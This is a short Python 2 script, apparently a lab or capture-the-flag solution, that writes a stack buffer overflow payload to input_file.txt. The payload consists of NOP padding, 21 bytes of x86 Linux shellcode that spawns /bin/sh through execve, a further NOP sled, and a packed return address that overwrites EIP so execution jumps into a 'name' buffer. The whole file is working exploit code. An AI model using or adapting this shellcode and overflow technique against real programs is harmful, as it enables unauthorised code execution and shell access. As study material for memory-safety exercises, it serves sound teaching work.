#!/usr/bin/python

import sys, struct

sys.stdout=open("input_file.txt","w")

#21 bytes payload
payload ="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

ret_addr = 0x80dacc6  # address of name at 0x80dacc0
buf_len = 32
padding = "\x90" * (buf_len-len(payload)) #32-21=11
NOP = "\x90" * 16

EIP = struct.pack("I", ret_addr)

#payload is the correctly presented shell code. 21 bytes
print padding + payload + NOP + EIP

sys.stdout.close()